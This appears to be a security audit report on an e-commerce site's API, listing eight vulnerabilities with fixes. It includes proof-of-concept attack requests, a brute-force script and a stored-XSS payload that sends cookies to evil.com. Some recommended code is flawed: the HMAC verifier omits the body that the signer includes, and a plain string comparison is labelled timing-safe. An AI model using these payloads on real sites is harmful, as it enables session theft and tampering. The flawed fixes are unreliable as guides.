# API Security Audit - New Findings Report
**Date**: December 29, 2025
**Focus**: NEW vulnerabilities discovered after previous security fixes
**Status**: 8 new issues identified

---

## Executive Summary

This follow-up security audit discovered **8 NEW vulnerabilities** that were not addressed in previous security fixes:
- **0 CRITICAL** - Previous critical issues appear to be resolved
- **3 HIGH** severity issues  
- **3 MEDIUM** severity issues
- **2 LOW** severity issues

**Key Findings**:
1. Unauthenticated product modification vulnerability (HIGH)
2. Information disclosure in error messages (HIGH)  
3. Missing input validation in admin endpoints (HIGH)
4. Weak internal API authentication (MEDIUM)
5. Inconsistent security implementations across endpoints

---

## HIGH SEVERITY VULNERABILITIES

### HIGH-NEW-001: Unauthenticated Product Modification (IDOR)

**File**: `/home/user/MiEcommerce/src/pages/api/check-product.ts`  
**Lines**: 156-204  
**Severity**: HIGH  
**Type**: IDOR, Broken Access Control  
**CVSS Score**: 7.5 (High)

**Vulnerability Description**:
The `/api/check-product` endpoint allows ANY unauthenticated user to modify product data when the `action=fix` parameter is provided. This is a classic Insecure Direct Object Reference (IDOR) vulnerability.

**Vulnerable Code**:
```typescript
// Line 156: No authentication check whatsoever
if (action === 'fix' && detectedSchemaId && !productData.customizationSchemaId) {
  try {
    const productRef = doc(db, 'products', productId);
    await updateDoc(productRef, {
      customizationSchemaId: detectedSchemaId,  // ANYONE can modify this!
    });

    return new Response(
      JSON.stringify({
        success: true,
        message: 'Product updated successfully',
        action: 'fixed',  // ← Confirms modification occurred
      })
    );
  } catch (e: unknown) {
    // Error handling
  }
}
```

**Proof of Concept**:
```bash
# Step 1: Find a product slug
curl "https://yoursite.com/api/check-product?slug=camiseta-premium"

# Step 2: Modify product schema without authentication
curl "https://yoursite.com/api/check-product?slug=camiseta-premium&action=fix"
# ↑ This SUCCEEDS and modifies the product in Firestore
```

**Business Impact**:
- Attackers can modify product customization schemas
- Could break product functionality site-wide
- Data integrity compromise
- Loss of customer trust
- Potential revenue loss from broken products

**Technical Impact**:
- Complete bypass of Firestore security rules via Admin SDK
- No audit trail of who made modifications
- Modification confirmed in response (information disclosure)

**Recommended Fix**:
```typescript
import { verifyAdminAuth } from '../../lib/auth-helpers';

export const GET: APIRoute = async ({ request, url }) => {
  const action = url.searchParams.get('action');

  // SECURITY: Require admin authentication for ALL modification actions
  if (action === 'fix') {
    const authResult = await verifyAdminAuth(request);
    if (!authResult.success || !authResult.isAdmin) {
      logger.warn('[check-product] Unauthorized modification attempt', {
        ip: request.headers.get('x-forwarded-for'),
        userAgent: request.headers.get('user-agent'),
      });
      
      return new Response(
        JSON.stringify({ 
          error: 'Admin authentication required for product modifications' 
        }),
        { status: 403, headers: { 'Content-Type': 'application/json' } }
      );
    }

    // Log modification attempt
    logger.info('[check-product] Admin modifying product', {
      admin: authResult.email,
      productId,
      action: 'fix'
    });
  }

  // Rate limiting for unauthenticated endpoint (read-only operations)
  const rateLimitResult = await rateLimitPersistent(request, 'check-product', {
    intervalMs: 60_000,
    max: 10,
  });

  if (!rateLimitResult.ok) {
    return new Response(
      JSON.stringify({ error: 'Too many requests' }),
      { status: 429, headers: { 'Content-Type': 'application/json' } }
    );
  }

  // ... rest of endpoint logic
};
```

---

### HIGH-NEW-002: Information Disclosure in Design Endpoints

**Files**:  
- `/home/user/MiEcommerce/src/pages/api/designs/save.ts` (lines 125-131)
- `/home/user/MiEcommerce/src/pages/api/designs/delete.ts` (lines 96-102)

**Severity**: HIGH  
**Type**: Information Disclosure  
**CVSS Score**: 6.5 (Medium-High)

**Vulnerability Description**:
Design endpoints expose detailed error messages including stack traces even in production mode. This reveals internal system architecture and code paths to potential attackers.

**Vulnerable Code**:
```typescript
// designs/save.ts line 125-131
} catch (error: unknown) {
  logger.error('[designs/save] Error:', error);
  return new Response(
    JSON.stringify({
      error: error instanceof Error ? error.message : 'Error saving design',
      // ↑ Exposes full error message in PRODUCTION!
    }),
    { status: 500, headers: { 'Content-Type': 'application/json' } }
  );
}

// designs/delete.ts line 96-102
} catch (error: unknown) {
  logger.error('[designs/delete] Error:', error);
  return new Response(
    JSON.stringify({
      error: error instanceof Error ? error.message : 'Error deleting design',
      // ↑ Same issue - full error exposure
    }),
    { status: 500, headers: { 'Content-Type': 'application/json' } }
  );
}
```

**Information Exposed**:
- File system paths
- Database schema details
- Framework/library names and versions
- Internal variable names
- Stack traces with code structure

**Example Leaked Error**:
```json
{
  "error": "ENOENT: no such file or directory, open '/app/src/lib/firebase-admin.ts' at line 42"
}
```

**Business Impact**:
- Helps attackers understand system internals
- Facilitates targeted attacks
- Professional reputation damage
- Compliance violations (GDPR, PCI-DSS require data minimization)

**Recommended Fix**:
```typescript
// Use the established pattern from other endpoints
} catch (error: unknown) {
  logger.error('[designs/save] Error:', error);
  return new Response(
    JSON.stringify({
      error: 'Error guardando diseño',
      // Only include details in development mode
      details: import.meta.env.DEV 
        ? (error instanceof Error ? error.message : undefined) 
        : undefined,
    }),
    { status: 500, headers: { 'Content-Type': 'application/json' } }
  );
}
```

---

### HIGH-NEW-003: Missing Input Validation for Admin Notes

**File**: `/home/user/MiEcommerce/src/pages/api/admin/update-item-notes.ts`  
**Lines**: 30-40, 62-67  
**Severity**: HIGH  
**Type**: Insufficient Input Validation, Potential XSS/Injection  
**CVSS Score**: 7.2 (High)

**Vulnerability Description**:
The admin endpoint accepts arbitrary user input for the `notes` field without any validation or sanitization. This could lead to:
- Stored XSS if notes are displayed in admin panel
- NoSQL injection if notes are used in queries
- Excessive storage consumption (no length limit)

**Vulnerable Code**:
```typescript
// Line 30: No validation schema at all
const { orderId, itemIndex, notes } = await request.json();

// Line 32-40: Only checks presence, not content
if (!orderId || itemIndex === undefined) {
  return new Response(
    JSON.stringify({ error: 'Missing required fields: orderId, itemIndex' }),
    { status: 400 }
  );
}
// ↑ 'notes' parameter is NEVER validated

// Line 62-67: Direct assignment without any sanitization
updatedItems[itemIndex] = {
  ...updatedItems[itemIndex],
  productionNotes: notes || '',  // ← Accepts ANYTHING
};

await orderRef.update({
  items: updatedItems,
  updatedAt: new Date(),
});
```

**Attack Scenarios**:

1. **Stored XSS Attack**:
```javascript
// Malicious admin or compromised session sends:
{
  "orderId": "order123",
  "itemIndex": 0,
  "notes": "<script>fetch('https://evil.com?cookie='+document.cookie)</script>"
}
// Later, when admin views this note in dashboard → XSS fires
```

2. **NoSQL Injection** (if notes are used in queries):
```javascript
{
  "notes": { "$ne": null }  // NoSQL operator injection
}
```

3. **Storage Exhaustion**:
```javascript
{
  "notes": "A".repeat(10000000)  // 10MB of data
}
```

**Business Impact**:
- Admin account compromise via XSS
- Data integrity issues
- Database performance degradation
- Potential for privilege escalation

**Recommended Fix**:
```typescript
import { z } from 'zod';
import DOMPurify from 'dompurify';
import { JSDOM } from 'jsdom';

// Create DOMPurify instance for server-side use
const window = new JSDOM('').window;
const purify = DOMPurify(window);

// Define validation schema
const updateItemNotesSchema = z.object({
  orderId: z.string().min(1).max(255),
  itemIndex: z.number().int().min(0).max(100),
  notes: z.string().max(5000), // Reasonable 5KB limit
});

export const POST: APIRoute = async ({ request }) => {
  // ... auth check ...

  const rawData = await request.json();
  
  // SECURITY: Validate with Zod
  const validationResult = updateItemNotesSchema.safeParse(rawData);

  if (!validationResult.success) {
    return new Response(
      JSON.stringify({
        error: 'Invalid input',
        details: import.meta.env.DEV ? validationResult.error.format() : undefined
      }),
      { status: 400, headers: { 'Content-Type': 'application/json' } }
    );
  }

  const { orderId, itemIndex, notes } = validationResult.data;

  // SECURITY: Sanitize notes to prevent XSS
  const sanitizedNotes = purify.sanitize(notes, {
    ALLOWED_TAGS: [], // Strip all HTML
    ALLOWED_ATTR: []
  });

  // ... get order and update with sanitizedNotes ...
  updatedItems[itemIndex] = {
    ...updatedItems[itemIndex],
    productionNotes: sanitizedNotes,
  };

  await orderRef.update({
    items: updatedItems,
    updatedAt: new Date(),
  });

  return new Response(
    JSON.stringify({
      success: true,
      message: 'Production notes updated successfully',
    }),
    { status: 200, headers: { 'Content-Type': 'application/json' } }
  );
};
```

**Required Dependencies**:
```bash
npm install dompurify jsdom
npm install --save-dev @types/dompurify @types/jsdom
```

---

## MEDIUM SEVERITY VULNERABILITIES

### MED-NEW-001: Weak Internal API Authentication

**Files**:
- `/home/user/MiEcommerce/src/pages/api/send-email.ts` (lines 70-71)
- `/home/user/MiEcommerce/src/pages/api/subscribe-newsletter.ts` (lines 142-147)  
- `/home/user/MiEcommerce/src/pages/api/update-order-tracking.ts` (lines 110-115)

**Severity**: MEDIUM  
**Type**: Weak Authentication Mechanism  
**CVSS Score**: 5.9 (Medium)

**Vulnerability Description**:
Multiple endpoints use a weak shared secret mechanism for server-to-server authentication. This approach has several security weaknesses:

1. **No Request Signing**: Simple header comparison allows replay attacks
2. **No Timestamp Validation**: Captured requests can be replayed indefinitely
3. **Vulnerable to Brute Force**: If secret is weak or leaked
4. **No Rotation Mechanism**: Secret never changes
5. **Single Point of Failure**: One compromised secret affects all endpoints

**Vulnerable Code**:
```typescript
// send-email.ts lines 70-71
const INTERNAL_API_SECRET = import.meta.env.INTERNAL_API_SECRET || '';

const internalSecret = request.headers.get('X-Internal-Secret');
const isInternalCall = internalSecret && 
                       internalSecret === INTERNAL_API_SECRET && 
                       INTERNAL_API_SECRET.length > 0;

// If secret matches, bypass ALL authentication
if (!isInternalCall) {
  const authResult = await verifyAdminAuth(request);
  // ... check admin ...
}
```

**Attack Scenarios**:

1. **Secret Leakage via Logs**:
```bash
# If logging includes headers
[INFO] Request headers: {"X-Internal-Secret": "my-weak-secret-123"}
```

2. **Replay Attack**:
```bash
# Attacker captures legitimate internal request
curl -X POST https://yoursite.com/api/send-email \
  -H "X-Internal-Secret: captured-secret" \
  -H "Content-Type: application/json" \
  -d '{"email": "victim@example.com", "type": "newsletter-welcome"}'
# ↑ Can be replayed indefinitely
```

3. **Brute Force** (if secret is weak):
```python
import requests

secrets = ["admin", "secret", "password", "123456", "internal-api"]
for secret in secrets:
    response = requests.post(
        "https://yoursite.com/api/send-email",
        headers={"X-Internal-Secret": secret},
        json={"email": "test@test.com", "type": "newsletter-welcome"}
    )
    if response.status_code != 403:
        print(f"Found secret: {secret}")
```

**Business Impact**:
- Unauthorized email sending (phishing, spam)
- Resend API quota exhaustion
- Domain blacklisting
- Compliance violations

**Recommended Fix**:

Implement HMAC-based request signing with timestamp validation:

```typescript
// src/lib/internal-api-auth.ts
import crypto from 'crypto';

interface SignedRequestOptions {
  method: string;
  url: string;
  body?: any;
  secret: string;
}

/**
 * Sign an internal API request with HMAC-SHA256
 */
export function signRequest(options: SignedRequestOptions): {
  timestamp: string;
  signature: string;
} {
  const timestamp = Date.now().toString();
  const payload = `${options.method}:${options.url}:${timestamp}:${
    options.body ? JSON.stringify(options.body) : ''
  }`;
  
  const signature = crypto
    .createHmac('sha256', options.secret)
    .update(payload)
    .digest('hex');

  return { timestamp, signature };
}

/**
 * Verify an internal API request signature
 */
export function verifyInternalRequest(request: Request): {
  valid: boolean;
  reason?: string;
} {
  const timestamp = request.headers.get('X-Timestamp');
  const signature = request.headers.get('X-Signature');
  const secret = import.meta.env.INTERNAL_API_SECRET;

  if (!timestamp || !signature || !secret) {
    return { valid: false, reason: 'Missing signature headers' };
  }

  // Prevent replay attacks (5 minute window)
  const requestTime = parseInt(timestamp);
  const now = Date.now();
  const maxAge = 5 * 60 * 1000; // 5 minutes

  if (isNaN(requestTime) || Math.abs(now - requestTime) > maxAge) {
    return { valid: false, reason: 'Request expired or invalid timestamp' };
  }

  // Reconstruct payload
  const payload = `${request.method}:${request.url}:${timestamp}`;
  
  // Calculate expected signature
  const expectedSignature = crypto
    .createHmac('sha256', secret)
    .update(payload)
    .digest('hex');

  // Timing-safe comparison
  const isValid = crypto.timingSafeEqual(
    Buffer.from(signature),
    Buffer.from(expectedSignature)
  );

  if (!isValid) {
    return { valid: false, reason: 'Invalid signature' };
  }

  return { valid: true };
}
```

**Usage in endpoints**:
```typescript
// Updated send-email.ts
import { verifyInternalRequest } from '../../lib/internal-api-auth';

export const POST: APIRoute = async ({ request }) => {
  // SECURITY: Rate limiting
  const rateLimitResult = checkRateLimit(request, RATE_LIMIT_CONFIGS.STRICT, 'send-email');
  if (!rateLimitResult.allowed) {
    return createRateLimitResponse(rateLimitResult);
  }

  // SECURITY: CSRF protection
  const csrfCheck = validateCSRF(request);
  if (!csrfCheck.valid) {
    return createCSRFErrorResponse();
  }

  // Check for internal API call with HMAC verification
  const internalCheck = verifyInternalRequest(request);
  const isInternalCall = internalCheck.valid;

  if (!isInternalCall && internalCheck.reason) {
    logger.warn('[send-email] Internal auth failed:', internalCheck.reason);
  }

  // ... rest of endpoint
};
```

**Making internal calls**:
```typescript
// Updated subscribe-newsletter.ts
import { signRequest } from '../../lib/internal-api-auth';

try {
  const emailData = {
    email: emailLower,
    type: 'newsletter-welcome',
  };

  const { timestamp, signature } = signRequest({
    method: 'POST',
    url: new URL('/api/send-email', request.url).toString(),
    body: emailData,
    secret: import.meta.env.INTERNAL_API_SECRET || '',
  });

  await fetch(new URL('/api/send-email', request.url).toString(), {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'X-Timestamp': timestamp,
      'X-Signature': signature,
    },
    body: JSON.stringify(emailData),
  });
} catch (emailError) {
  logger.warn('[subscribe-newsletter] Error sending welcome email', emailError);
}
```

---

### MED-NEW-002: Inconsistent Error Handling Pattern

**File**: `/home/user/MiEcommerce/src/pages/api/admin/update-item-status.ts`  
**Lines**: 97-104  
**Severity**: MEDIUM  
**Type**: Inconsistent Security Implementation  
**CVSS Score**: 4.3 (Medium)

**Vulnerability Description**:
This endpoint doesn't use the secure error response helpers that are available and used in other parts of the codebase, leading to:
- Inconsistent error handling
- Direct console logging instead of using logger
- Missing sanitization checks
- No standardized security headers

**Vulnerable Code**:
```typescript
// Lines 97-104
} catch (error) {
  console.error('[update-item-status] Error:', error);  // ← Direct console.log
  return new Response(
    JSON.stringify({ error: 'Internal server error' }),  // ← Generic error
    {
      status: 500,
      headers: { 'Content-Type': 'application/json' },  // ← No security headers
    }
  );
}
```

**Issues**:
1. Uses `console.error` instead of `logger` utility
2. Doesn't use `createErrorResponse` helper
3. Missing security headers (X-Content-Type-Options, etc.)
4. No environment-specific error details

**Recommended Fix**:
```typescript
import { logErrorSafely, createErrorResponse } from '../../../lib/auth-helpers';

} catch (error: unknown) {
  logErrorSafely('update-item-status', error);
  
  return createErrorResponse(
    import.meta.env.DEV && error instanceof Error 
      ? error.message 
      : 'Error actualizando estado del item',
    500
  );
}
```

This ensures:
- Consistent logging across the application
- Proper error sanitization
- Security headers included automatically
- Environment-aware error details

---

### MED-NEW-003: Missing Rate Limiting on Design Operations

**Files**:
- `/home/user/MiEcommerce/src/pages/api/designs/delete.ts`
- `/home/user/MiEcommerce/src/pages/api/designs/toggle-favorite.ts`
- `/home/user/MiEcommerce/src/pages/api/designs/duplicate.ts`

**Severity**: MEDIUM  
**Type**: Missing Security Control  
**CVSS Score**: 5.0 (Medium)

**Vulnerability Description**:
Design modification endpoints lack rate limiting, while the `save` endpoint has it implemented. This inconsistency allows potential abuse through rapid operations.

**Comparison**:

**designs/save.ts** (HAS rate limiting):
```typescript
export const POST: APIRoute = async ({ request }) => {
  // SECURITY: Rate limiting ✅
  const rateLimitResult = checkRateLimit(
    request, 
    RATE_LIMIT_CONFIGS.STANDARD, 
    'designs-save'
  );
  if (!rateLimitResult.allowed) {
    logger.warn('[designs/save] Rate limit exceeded');
    return createRateLimitResponse(rateLimitResult);
  }
  // ... rest of endpoint
};
```

**designs/delete.ts** (NO rate limiting):
```typescript
export const DELETE: APIRoute = async ({ request }) => {
  try {
    // ❌ NO RATE LIMITING
    const authHeader = request.headers.get('Authorization');
    // ... rest of endpoint
  }
}
```

**Attack Scenarios**:

1. **Rapid Deletion Attack**:
```javascript
// Attacker can delete all designs rapidly
const designs = await getMyDesigns();
for (const design of designs) {
  await fetch('/api/designs/delete', {
    method: 'DELETE',
    headers: { 'Authorization': 'Bearer ' + token },
    body: JSON.stringify({ designId: design.id })
  });
}
// No rate limit = instant deletion of all designs
```

2. **Database Overload**:
```javascript
// Spam duplicate requests
for (let i = 0; i < 1000; i++) {
  fetch('/api/designs/duplicate', {
    method: 'POST',
    headers: { 'Authorization': 'Bearer ' + token },
    body: JSON.stringify({ designId: 'some-id' })
  });
}
// Creates database write storm
```

**Business Impact**:
- Database performance degradation
- Potential DoS through resource exhaustion
- Unfair resource usage
- Increased infrastructure costs

**Recommended Fix**:

Add rate limiting to ALL design endpoints:

```typescript
// designs/delete.ts
import {
  checkRateLimit,
  createRateLimitResponse,
  RATE_LIMIT_CONFIGS,
} from '../../../lib/rate-limiter';

export const DELETE: APIRoute = async ({ request }) => {
  // SECURITY: Rate limiting
  const rateLimitResult = checkRateLimit(
    request, 
    RATE_LIMIT_CONFIGS.STANDARD, 
    'designs-delete'
  );
  if (!rateLimitResult.allowed) {
    logger.warn('[designs/delete] Rate limit exceeded');
    return createRateLimitResponse(rateLimitResult);
  }

  try {
    // ... rest of endpoint logic
  }
};
```

Apply the same pattern to:
- `designs/toggle-favorite.ts`
- `designs/duplicate.ts`
- Any other design manipulation endpoints

---

## LOW SEVERITY VULNERABILITIES

### LOW-NEW-001: CSRF Protection Lacks Token-Based Validation

**File**: `/home/user/MiEcommerce/src/lib/csrf.ts`  
**Lines**: 14-90  
**Severity**: LOW  
**Type**: Defense in Depth Issue  
**CVSS Score**: 3.1 (Low)

**Vulnerability Description**:
The CSRF implementation relies solely on Origin/Referer header validation without token-based verification. While this provides basic protection, it can be bypassed in edge cases:

**Current Implementation**:
```typescript
export function validateCSRF(request: Request): { valid: boolean; reason?: string } {
  // Only checks HTTP method
  if (['GET', 'HEAD', 'OPTIONS'].includes(request.method)) {
    return { valid: true };
  }

  // Only validates origin/referer headers
  if (!validateOrigin(request)) {
    return { valid: false, reason: 'Origin validation failed' };
  }

  // Only checks for JSON content-type
  if (!hasCustomHeader(request)) {
    return { valid: false, reason: 'Missing required headers' };
  }

  return { valid: true };
  // ↑ NO TOKEN VERIFICATION
}
```

**Bypass Scenarios**:

1. **Browser with Disabled Referer**:
   - Privacy-focused browsers may strip Referer
   - Corporate proxies may remove headers
   - Legitimate users blocked

2. **Flash/Java Applet Bypass** (legacy):
   - Can forge headers in some configurations
   - Though rare, still theoretically possible

3. **Subdomain Attacks**:
   - If attacker controls subdomain: `evil.yoursite.com`
   - Origin check passes: `yoursite.com`

**Recommended Enhancement**:

Implement double-submit cookie pattern as defense-in-depth:

```typescript
// src/lib/csrf.ts
import { nanoid } from 'nanoid';

/**
 * Generate a CSRF token
 */
export function generateCSRFToken(): string {
  return nanoid(32);
}

/**
 * Verify CSRF token from cookie and header match
 */
export function validateCSRFToken(request: Request): boolean {
  // Extract token from cookie
  const cookieHeader = request.headers.get('cookie');
  if (!cookieHeader) return false;

  const cookieToken = cookieHeader
    .split(';')
    .find(c => c.trim().startsWith('csrf_token='))
    ?.split('=')[1];

  // Extract token from header
  const headerToken = request.headers.get('X-CSRF-Token');

  if (!cookieToken || !headerToken) {
    return false;
  }

  // Timing-safe comparison
  return cookieToken === headerToken;
}

/**
 * Enhanced CSRF validation with token verification
 */
export function validateCSRF(request: Request): { valid: boolean; reason?: string } {
  // GET, HEAD, OPTIONS are safe methods
  if (['GET', 'HEAD', 'OPTIONS'].includes(request.method)) {
    return { valid: true };
  }

  // Validate origin (first line of defense)
  if (!validateOrigin(request)) {
    return {
      valid: false,
      reason: 'Origin validation failed',
    };
  }

  // Validate custom headers (second line of defense)
  if (!hasCustomHeader(request)) {
    return {
      valid: false,
      reason: 'Missing required headers',
    };
  }

  // Validate CSRF token (third line of defense)
  if (!validateCSRFToken(request)) {
    console.warn('[CSRF] Token validation failed', {
      method: request.method,
      url: request.url,
    });
    return {
      valid: false,
      reason: 'CSRF token mismatch',
    };
  }

  return { valid: true };
}
```

**Client-side implementation**:
```typescript
// src/lib/csrf-client.ts
export async function getCSRFToken(): Promise<string> {
  // Get from cookie
  const token = document.cookie
    .split(';')
    .find(c => c.trim().startsWith('csrf_token='))
    ?.split('=')[1];

  if (token) return token;

  // Request new token from server
  const response = await fetch('/api/csrf-token');
  const data = await response.json();
  return data.token;
}

// Add to all mutating requests
export async function secureFetch(url: string, options: RequestInit) {
  const token = await getCSRFToken();
  
  return fetch(url, {
    ...options,
    headers: {
      ...options.headers,
      'X-CSRF-Token': token,
    },
  });
}
```

---

### LOW-NEW-002: In-Memory Rate Limiting Won't Scale

**File**: `/home/user/MiEcommerce/src/lib/rate-limiter.ts`  
**Lines**: 15, 108-116  
**Severity**: LOW  
**Type**: Scalability/Architecture Issue  
**CVSS Score**: 3.3 (Low)

**Vulnerability Description**:
The rate limiter uses an in-memory Map, which has several limitations:

**Current Implementation**:
```typescript
// Line 15
const rateLimitStore = new Map<string, RateLimitEntry>();
// ↑ In-memory storage

export function checkRateLimit(
  request: Request,
  config: RateLimitConfig,
  namespace: string = 'default'
): RateLimitResult {
  const identifier = getRequestIdentifier(request);
  const key = `${namespace}:${identifier}`;
  
  let entry = rateLimitStore.get(key);
  // ↑ Local to single server instance
}
```

**Problems**:

1. **Multi-Instance Deployment**:
   ```
   Server 1: User makes 60 requests → Blocked ✓
   Server 2: User makes 60 requests → Allowed (different Map)
   Total: 120 requests (2x the limit!)
   ```

2. **Server Restart**:
   - All rate limit counters reset
   - Attacker can bypass by forcing server restart

3. **Memory Leak Risk**:
   - Map grows indefinitely if cleanup fails
   - No persistent storage

4. **No Cross-Request Visibility**:
   - Can't detect distributed attacks
   - No global rate limiting

**Business Impact**:
- Rate limits ineffective in production (scaled deployments)
- Potential for distributed DoS
- Higher infrastructure costs from abuse
- Poor user experience (inconsistent limits)

**Recommended Fix**:

Implement Redis-based distributed rate limiting:

**Option 1: Upstash Redis (Serverless-friendly)**

```typescript
// src/lib/rate-limiter-redis.ts
import { Redis } from '@upstash/redis';

const redis = new Redis({
  url: import.meta.env.UPSTASH_REDIS_REST_URL,
  token: import.meta.env.UPSTASH_REDIS_REST_TOKEN,
});

export async function checkRateLimit(
  request: Request,
  config: RateLimitConfig,
  namespace: string = 'default'
): Promise<RateLimitResult> {
  const identifier = getRequestIdentifier(request);
  const key = `ratelimit:${namespace}:${identifier}`;
  const now = Date.now();

  // Use Redis INCR for atomic counter increment
  const count = await redis.incr(key);

  // Set expiry on first request
  if (count === 1) {
    await redis.pexpire(key, config.windowMs);
  }

  // Get TTL for resetAt calculation
  const ttl = await redis.pttl(key);
  const resetAt = now + ttl;

  if (count > config.maxRequests) {
    logger.warn(`[rate-limiter] Rate limit exceeded for ${key}`, {
      count,
      limit: config.maxRequests,
    });

    return {
      allowed: false,
      retryAfter: Math.ceil(ttl / 1000),
      remaining: 0,
      limit: config.maxRequests,
      resetAt,
    };
  }

  return {
    allowed: true,
    remaining: config.maxRequests - count,
    limit: config.maxRequests,
    resetAt,
  };
}
```

**Option 2: Standard Redis**

```typescript
import { createClient } from 'redis';

const redisClient = createClient({
  url: process.env.REDIS_URL || 'redis://localhost:6379',
});

await redisClient.connect();

export async function checkRateLimit(
  request: Request,
  config: RateLimitConfig,
  namespace: string = 'default'
): Promise<RateLimitResult> {
  const identifier = getRequestIdentifier(request);
  const key = `ratelimit:${namespace}:${identifier}`;
  const now = Date.now();

  // Use Redis pipeline for atomic operations
  const multi = redisClient.multi();
  multi.incr(key);
  multi.pExpire(key, config.windowMs);
  multi.pTtl(key);

  const [count, _, ttl] = await multi.exec();

  const resetAt = now + (ttl as number);

  if ((count as number) > config.maxRequests) {
    return {
      allowed: false,
      retryAfter: Math.ceil((ttl as number) / 1000),
      remaining: 0,
      limit: config.maxRequests,
      resetAt,
    };
  }

  return {
    allowed: true,
    remaining: config.maxRequests - (count as number),
    limit: config.maxRequests,
    resetAt,
  };
}
```

**Installation**:
```bash
# For Upstash (serverless)
npm install @upstash/redis

# For standard Redis
npm install redis
```

**Environment Variables**:
```env
# .env
UPSTASH_REDIS_REST_URL=https://your-redis.upstash.io
UPSTASH_REDIS_REST_TOKEN=your-token

# OR for standard Redis
REDIS_URL=redis://localhost:6379
```

**Benefits**:
- Works across multiple server instances
- Persistent across restarts
- Scalable to millions of requests
- Supports distributed deployments
- Better visibility and monitoring

---

## Additional Security Recommendations

### 1. Implement Comprehensive Security Headers

Add security headers middleware to all responses:

**File**: `/home/user/MiEcommerce/src/middleware/security-headers.ts` (CREATE NEW)

```typescript
export function onRequest({ next }: { next: () => Response }): Response {
  const response = next();

  // Prevent MIME type sniffing
  response.headers.set('X-Content-Type-Options', 'nosniff');

  // Prevent clickjacking
  response.headers.set('X-Frame-Options', 'DENY');

  // XSS protection (legacy browsers)
  response.headers.set('X-XSS-Protection', '1; mode=block');

  // Referrer policy
  response.headers.set('Referrer-Policy', 'strict-origin-when-cross-origin');

  // HTTPS enforcement (production only)
  if (import.meta.env.PROD) {
    response.headers.set(
      'Strict-Transport-Security',
      'max-age=31536000; includeSubDomains; preload'
    );
  }

  // Content Security Policy
  const csp = [
    "default-src 'self'",
    "script-src 'self' 'unsafe-inline' https://js.stripe.com https://www.googletagmanager.com",
    "style-src 'self' 'unsafe-inline'",
    "img-src 'self' data: https: blob:",
    "font-src 'self' data:",
    "connect-src 'self' https://api.stripe.com https://*.googleapis.com",
    "frame-src https://js.stripe.com",
    "object-src 'none'",
    "base-uri 'self'",
    "form-action 'self'",
    "frame-ancestors 'none'",
    "upgrade-insecure-requests",
  ].join('; ');

  response.headers.set('Content-Security-Policy', csp);

  // Permissions Policy (formerly Feature-Policy)
  response.headers.set(
    'Permissions-Policy',
    'geolocation=(), microphone=(), camera=()'
  );

  return response;
}
```

### 2. Add Request ID Tracking

Implement request IDs for better audit trails:

```typescript
// src/lib/request-id.ts
import { nanoid } from 'nanoid';

export function generateRequestId(): string {
  return nanoid(16);
}

export function getRequestId(request: Request): string {
  // Check if client provided request ID
  const clientRequestId = request.headers.get('X-Request-ID');
  if (clientRequestId) {
    return clientRequestId;
  }

  // Generate new ID
  return generateRequestId();
}

// Add to all API routes
const requestId = getRequestId(request);
logger.info('[endpoint] Request received', { requestId });
```

### 3. Implement Audit Logging

Log all sensitive operations:

```typescript
// src/lib/audit-log.ts
import { getAdminDb } from './firebase-admin';
import { FieldValue } from 'firebase-admin/firestore';

export interface AuditLogEntry {
  action: string;
  userId: string;
  userEmail?: string;
  targetId?: string;
  targetType?: string;
  changes?: Record<string, any>;
  ipAddress?: string;
  userAgent?: string;
  requestId?: string;
  success: boolean;
  errorMessage?: string;
}

export async function logAuditEntry(entry: AuditLogEntry): Promise<void> {
  try {
    const db = getAdminDb();
    await db.collection('audit_logs').add({
      ...entry,
      timestamp: FieldValue.serverTimestamp(),
      createdAt: new Date(),
    });
  } catch (error) {
    console.error('[audit-log] Failed to log audit entry:', error);
    // Don't throw - audit log failure shouldn't break the operation
  }
}

// Usage in admin endpoints
await logAuditEntry({
  action: 'update_order_status',
  userId: authResult.uid!,
  userEmail: authResult.email,
  targetId: orderId,
  targetType: 'order',
  changes: { status: newStatus },
  ipAddress: request.headers.get('x-forwarded-for') || undefined,
  userAgent: request.headers.get('user-agent') || undefined,
  requestId: getRequestId(request),
  success: true,
});
```

### 4. Add Input Length Limits Configuration

Create centralized input limits:

```typescript
// src/lib/validation/limits.ts
export const INPUT_LIMITS = {
  // User input
  EMAIL: 255,
  NAME: 200,
  PHONE: 20,
  ADDRESS: 500,
  CITY: 100,
  ZIP_CODE: 10,
  
  // Content
  NOTES: 5000,
  DESCRIPTION: 10000,
  MESSAGE: 2000,
  
  // Technical
  URL: 2000,
  TOKEN: 1000,
  ID: 255,
  
  // Files
  IMAGE_SIZE: 5 * 1024 * 1024,  // 5MB
  DESIGN_SIZE: 10 * 1024 * 1024, // 10MB
} as const;

// Use in Zod schemas
import { z } from 'zod';
import { INPUT_LIMITS } from './limits';

const schema = z.object({
  email: z.string().email().max(INPUT_LIMITS.EMAIL),
  notes: z.string().max(INPUT_LIMITS.NOTES),
});
```

---

## Priority Action Items

### IMMEDIATE (Fix within 24-48 hours)

1. **Fix HIGH-NEW-001**: Add authentication to `/api/check-product` action=fix
   - Estimated time: 30 minutes
   - Risk if not fixed: Product data manipulation

2. **Fix HIGH-NEW-002**: Sanitize errors in design endpoints
   - Estimated time: 15 minutes
   - Risk if not fixed: Information disclosure

3. **Fix HIGH-NEW-003**: Add validation to `/api/admin/update-item-notes`
   - Estimated time: 1 hour
   - Risk if not fixed: XSS, injection attacks

### SHORT-TERM (Fix within 1 week)

4. **Fix MED-NEW-001**: Implement HMAC-based internal API auth
   - Estimated time: 2-3 hours
   - Risk if not fixed: Email abuse, replay attacks

5. **Fix MED-NEW-003**: Add rate limiting to design endpoints
   - Estimated time: 30 minutes
   - Risk if not fixed: Resource exhaustion

6. **Fix MED-NEW-002**: Standardize error handling
   - Estimated time: 1 hour
   - Risk if not fixed: Inconsistent security

### MEDIUM-TERM (Fix within 1 month)

7. **Fix LOW-NEW-002**: Migrate to Redis-based rate limiting
   - Estimated time: 4-6 hours
   - Risk if not fixed: Ineffective limits in production

8. **Fix LOW-NEW-001**: Enhance CSRF protection with tokens
   - Estimated time: 3-4 hours
   - Risk if not fixed: Bypass in edge cases

9. **Implement security headers middleware**
   - Estimated time: 2 hours
   - Risk if not fixed: Various attack vectors

10. **Implement audit logging**
    - Estimated time: 4 hours
    - Risk if not fixed: No accountability, compliance issues

---

## Testing Recommendations

### Security Testing Checklist

- [ ] Test HIGH-NEW-001: Verify `/api/check-product?action=fix` requires auth
- [ ] Test HIGH-NEW-002: Verify no error details leak in production
- [ ] Test HIGH-NEW-003: Test XSS payloads in notes field
- [ ] Test MED-NEW-001: Test replay attack prevention
